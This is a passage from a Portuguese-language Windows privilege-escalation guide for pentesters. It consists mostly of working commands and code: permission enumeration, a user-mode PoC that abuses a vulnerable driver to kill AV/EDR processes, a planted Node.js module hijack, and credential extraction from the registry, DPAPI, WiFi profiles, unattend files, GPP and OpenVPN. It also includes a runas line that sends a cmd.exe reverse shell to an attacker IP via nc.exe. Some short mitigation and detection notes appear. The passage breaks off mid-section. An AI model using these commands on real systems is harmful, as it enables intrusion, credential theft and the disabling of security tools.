accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ carrega automaticamente qualquer DLL de plugin dentro de suas subpastas `plugins`. Se houver uma instalação portable/copy gravável, colocar um plugin malicioso dá execução automática de código dentro de `notepad++.exe` a cada inicialização (incluindo a partir de `DllMain` e callbacks de plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Verifique se você consegue sobrescrever algum registry ou binary que será executado por outro usuário.**\
**Leia** a **seguinte página** para aprender mais sobre locais interessantes de **autoruns para escalar privilégios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Procure por possíveis drivers **third party weird/vulnerable**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se um driver expõe um primitive arbitrário de leitura/escrita de kernel (comum em handlers IOCTL mal projetados), você pode elevar privilégios roubando diretamente um token SYSTEM da memória do kernel. Veja a técnica passo a passo aqui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race-condition em que a chamada vulnerável abre um caminho do Object Manager controlado pelo atacante, desacelerar deliberadamente a lookup (usando componentes de comprimento máximo ou cadeias profundas de diretórios) pode estender a janela de microssegundos para dezenas de microssegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives de corrupção de memória em registry hive

Vulnerabilidades modernas de hive permitem groom de layouts determinísticos, abuso de descendentes graváveis de HKLM/HKU e conversão de corrupção de metadados em overflows de kernel paged-pool sem um driver customizado. Aprenda a cadeia completa aqui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusão de tipo em `RtlQueryRegistryValues` no modo direto a partir de paths controlados pelo atacante

Alguns drivers aceitam um registry path do userland, validam apenas que é uma string UTF-16 válida e então chamam `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` com `RTL_QUERY_REGISTRY_DIRECT` em um escalar de stack como `int readValue`. Se `RTL_QUERY_REGISTRY_TYPECHECK` estiver ausente, `EntryContext` é interpretado de acordo com o **tipo real** do valor de registry, e não com o tipo que o desenvolvedor esperava.

Isso cria duas primitives úteis:

- **Confused deputy / oracle**: um caminho absoluto `\Registry\...` controlado pelo usuário permite ao driver consultar chaves escolhidas pelo atacante, vazar existência por códigos de retorno/logs e, às vezes, ler valores aos quais o chamador não teria acesso direto.
- **Corrupção de memória de kernel**: um destino escalar como `&readValue` fica com type confusion como um `REG_QWORD`, `UNICODE_STRING` ou buffer binário dimensionado, dependendo do tipo do valor de registry.

Notas práticas de exploração:

- **Mitigação no Windows 8+**: se a consulta atingir um **untrusted hive** com `RTL_QUERY_REGISTRY_DIRECT`, mas sem `RTL_QUERY_REGISTRY_TYPECHECK`, chamadores de kernel travam com `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para manter a explorabilidade, procure **chaves graváveis pelo atacante dentro de system hives confiáveis** em vez de preparar valores sob `HKCU`.
- **Staging em trusted-hive**: use NtObjectManager para enumerar descendentes graváveis de `\Registry\Machine` e execute novamente a varredura com um token **low-integrity** duplicado para encontrar chaves acessíveis a partir de contextos sandboxed:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: uma gravação direta de 8 bytes em um `int` de 4 bytes corrompe dados adjacentes da stack e pode sobrescrever parcialmente um callback ponteiro/função próximo.
- **`REG_SZ` / `REG_EXPAND_SZ`**: o modo direto espera que `EntryContext` aponte para uma `UNICODE_STRING`. Se o código primeiro carrega um `REG_DWORD` controlado pelo atacante em um escalar da stack e depois reutiliza esse mesmo buffer para uma leitura de string, o atacante controla `Length`/`MaximumLength` e influencia parcialmente o ponteiro `Buffer`, resultando em uma semi-controlled kernel write.
- **`REG_BINARY`**: para dados binários grandes, o modo direto trata o primeiro `LONG` em `EntryContext` como um tamanho de buffer com sinal. Se uma leitura anterior de `REG_DWORD` deixar um valor **negativo** controlado pelo atacante no escalar reutilizado, a próxima query `REG_BINARY` copia bytes do atacante diretamente sobre slots adjacentes da stack, o que muitas vezes é o caminho mais limpo para sobrescrever um callback ponteiro por completo.

Padrão forte de hunting: **leituras heterogêneas do registry para a mesma variável da stack sem reinicializá-la**. Procure por `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponteiros `EntryContext` reutilizados e caminhos de código onde a primeira leitura do registry controla se uma segunda leitura acontece.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alguns drivers third-party assinados criam seu device object com um SDDL forte via IoCreateDeviceSecure mas esquecem de definir FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem esse flag, o DACL seguro não é aplicado quando o device é aberto por um caminho que contém um componente extra, permitindo que qualquer usuário sem privilégios obtenha um handle usando um namespace path como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Uma vez que um usuário consegue abrir o device, IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e adulteração. Capacidades observadas no mundo real:
- Retornar handles com acesso total para processos arbitrários (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write irrestrito (offline tampering, boot-time persistence tricks).
- Finalizar processos arbitrários, incluindo Protected Process/Light (PP/PPL), permitindo AV/EDR kill from user land via kernel.

Padrão mínimo de PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigações para desenvolvedores
- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar objetos de dispositivo destinados a serem restritos por um DACL.
- Valide o contexto do caller para operações privilegiadas. Adicione verificações PP/PPL antes de permitir o encerramento de processos ou retornos de handle.
- Restrinja IOCTLs (access masks, METHOD_*, validação de input) e considere modelos brokered em vez de privilégios diretos de kernel.

Ideias de detecção para defenders
- Monitore aberturas em user-mode de nomes de device suspeitos (por exemplo, \\ .\\amsdk*) e sequências específicas de IOCTL que indiquem abuso.
- Aplique o vulnerable driver blocklist da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias listas allow/deny.


## PATH DLL Hijacking

Se você tiver **permissões de escrita dentro de uma pasta presente no PATH**, você pode conseguir hijack de uma DLL carregada por um processo e **escalate privileges**.

Verifique as permissões de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informações sobre como abusar dessa verificação:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Sequestro de resolução de módulo Node.js / Electron via `C:\node_modules`

Esta é uma variante de **Windows uncontrolled search path** que afeta aplicações **Node.js** e **Electron** quando fazem um import direto como `require("foo")` e o módulo esperado está **ausente**.

O Node resolve pacotes subindo a árvore de diretórios e verificando pastas `node_modules` em cada diretório pai. No Windows, essa subida pode alcançar a raiz da unidade, então uma aplicação iniciada de `C:\Users\Administrator\project\app.js` pode acabar tentando:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se um **usuário com poucos privilégios** puder criar `C:\node_modules`, ele pode plantar um `foo.js` malicioso (ou uma pasta de pacote) e esperar que um processo **Node/Electron com privilégios mais altos** resolva a dependência ausente. O payload é executado no contexto de segurança do processo vítima, então isso se torna **LPE** sempre que o alvo roda como administrador, a partir de uma tarefa agendada/serviço com privilégios elevados, ou de um aplicativo de desktop com auto-start privilegiado.

Isso é especialmente comum quando:

- uma dependência é declarada em `optionalDependencies`
- uma biblioteca de terceiros envolve `require("foo")` em `try/catch` e continua em caso de falha
- um pacote foi removido das builds de produção, omitido durante o empacotamento ou falhou ao instalar
- o `require()` vulnerável fica profundamente na árvore de dependências em vez de estar no código principal da aplicação

### Procurando alvos vulneráveis

Use **Procmon** para provar o caminho de resolução:

- Filtre por `Process Name` = executável alvo (`node.exe`, o EXE do app Electron, ou o processo wrapper)
- Filtre por `Path` `contains` `node_modules`
- Foque em `NAME NOT FOUND` e na abertura final bem-sucedida em `C:\node_modules`

Padrões úteis de revisão de código em arquivos `.asar` descompactados ou em fontes da aplicação:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifique o **nome do pacote ausente** a partir do Procmon ou da revisão do código-fonte.
2. Crie o diretório de pesquisa raiz se ele ainda não existir:
```powershell
mkdir C:\node_modules
```
3. Solte um module com o nome exatamente esperado:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Acione a aplicação da vítima. Se a aplicação tentar `require("foo")` e o módulo legítimo estiver ausente, o Node pode carregar `C:\node_modules\foo.js`.

Exemplos reais de módulos opcionais ausentes que se encaixam nesse padrão incluem `bluebird` e `utf-8-validate`, mas a **técnica** é a parte reutilizável: encontre qualquer **bare import ausente** que um processo privilegiado do Windows Node/Electron resolva.

### Detection and hardening ideas

- Alerta quando um usuário criar `C:\node_modules` ou gravar novos arquivos/pacotes `.js` ali.
- Procure processos de alta integridade lendo de `C:\node_modules\*`.
- Empacote todas as dependências de runtime em produção e audite o uso de `optionalDependencies`.
- Revise código de terceiros em busca de padrões silenciosos `try { require("...") } catch {}`.
- Desative probes opcionais quando a biblioteca suportar isso (por exemplo, algumas implantações de `ws` podem evitar o probe legado `utf-8-validate` com `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Verifique se há outros computadores conhecidos codificados no arquivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Rede & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas Abertas

Verifique **serviços restritos** do lado de fora
```bash
netstat -ano #Opened ports?
```
### Tabela de Roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Confira esta página para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desligar, desligar...)**

Mais [comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você conseguir root user, você pode escutar em qualquer porta (na primeira vez que usar `nc.exe` para escutar em uma porta, ele vai perguntar via GUI se `nc` deve ser permitido pelo firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Windows Vault armazena credenciais de usuário para servidores, sites e outros programas que o **Windows** pode **fazer login dos usuários automaticamente**. À primeira vista, isso pode parecer que agora os usuários podem armazenar suas credenciais do Facebook, credenciais do Twitter, credenciais do Gmail etc., para que façam login automaticamente via navegadores. Mas não é assim.

O Windows Vault armazena credenciais que o Windows pode usar para fazer login dos usuários automaticamente, o que significa que qualquer **aplicação do Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode fazer uso deste Credential Manager** & Windows Vault e usar as credenciais fornecidas em vez de os usuários inserirem o nome de usuário e a senha o tempo todo.

A menos que as aplicações interajam com o Credential Manager, não acho que seja possível para elas usar as credenciais de um determinado recurso. Então, se a sua aplicação quiser fazer uso do vault, ela deve de alguma forma **se comunicar com o credential manager e solicitar as credenciais para esse recurso** a partir do vault de armazenamento padrão.

Use o `cmdkey` para listar as credenciais armazenadas na máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Então você pode usar `runas` com as opções `/savecred` para usar as credenciais salvas. O exemplo a seguir está chamando um binário remoto via um compartilhamento SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecido.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

A **Data Protection API (DPAPI)** fornece um método de criptografia simétrica de dados, predominantemente usado dentro do sistema operacional Windows para a criptografia simétrica de chaves privadas assimétricas. Essa criptografia utiliza um segredo de usuário ou de sistema para contribuir significativamente com a entropia.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. Em cenários envolvendo criptografia do sistema, ela utiliza os segredos de autenticação do domínio do sistema.

Chaves RSA de usuário criptografadas, usando DPAPI, são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde `{SID}` representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) do usuário. **A chave DPAPI, co-localizada com a master key que protege as chaves privadas do usuário no mesmo arquivo**, normalmente consiste em 64 bytes de dados aleatórios. (É importante notar que o acesso a esse diretório é restrito, impedindo listar seu conteúdo via o comando `dir` no CMD, embora ele possa ser listado pelo PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Você pode usar o **mimikatz module** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **credentials files protegidos pela master password** geralmente estão localizados em:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Você pode usar o **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\
Você pode **extrair many DPAPI** **masterkeys** da **memory** com o módulo `sekurlsa::dpapi` (se você for root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** são frequentemente usadas para tarefas de **scripting** e automação como uma forma de armazenar credenciais criptografadas de maneira conveniente. As credenciais são protegidas usando **DPAPI**, o que normalmente significa que elas só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Para **decrypt** uma credencial PS do arquivo que a contém, você pode fazer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexões RDP Salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos Executados Recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais da Área de Trabalho Remota**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use o módulo **Mimikatz** `dpapi::rdg` com o `/masterkey` apropriado para **descriptografar quaisquer arquivos .rdg**\
Você pode **extrair muitas masterkeys do DPAPI** da memória com o módulo `sekurlsa::dpapi` do Mimikatz

### Sticky Notes

As pessoas frequentemente usam o app StickyNotes em workstations Windows para **salvar senhas** e outras informações, sem perceber que ele é um arquivo de banco de dados. Esse arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurar e examinar.

### AppCmd.exe

**Observe que, para recuperar senhas do AppCmd.exe, você precisa ser Administrador e executar em um nível de High Integrity.**\
**AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\
Se esse arquivo existir, então é possível que algumas **credenciais** tenham sido configuradas e possam ser **recuperadas**.

Este código foi extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe .\
Os instaladores são **executados com privilégios SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registry (Credenciais)

### Credenciais do Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chaves de host SSH do Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

Chaves privadas SSH podem ser armazenadas dentro da chave do registro `HKCU\Software\OpenSSH\Agent\Keys`, então você deve verificar se há algo interessante lá:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se você encontrar qualquer entrada dentro desse caminho, provavelmente será uma chave SSH salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre essa técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente na inicialização, execute:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que essa técnica não é mais válida. Tentei criar algumas chaves ssh, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação de chave assimétrica.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Você também pode procurar por esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_

Exemplo de conteúdo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups de SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciais de Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure um arquivo chamado **SiteList.xml**

### Cached GPP Pasword

Uma funcionalidade estava anteriormente disponível e permitia a implantação de contas de administrador local personalizadas em um grupo de máquinas via Group Policy Preferences (GPP). No entanto, esse método tinha falhas de segurança significativas. Primeiro, os Group Policy Objects (GPOs), armazenados como arquivos XML em SYSVOL, podiam ser acessados por qualquer usuário do domínio. Segundo, as passwords dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois podia permitir que usuários obtivessem privilégios elevados.

Para mitigar esse risco, foi desenvolvida uma função para varrer arquivos GPP armazenados em cache localmente contendo um campo "cpassword" que não esteja vazio. Ao encontrar esse arquivo, a função descriptografa a password e retorna um objeto PowerShell personalizado. Esse objeto inclui detalhes sobre o GPP e a localização do arquivo, auxiliando na identificação e correção dessa vulnerabilidade de segurança.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ por estes arquivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descriptografar o cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credenciais:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credenciais

Você sempre pode **pedir ao usuário que insira suas credenciais ou até mesmo as credenciais de outro usuário** se achar que ele pode conhecê-las (observe que **pedir** diretamente ao cliente pelas **credenciais** é realmente **arriscado**):
```bash
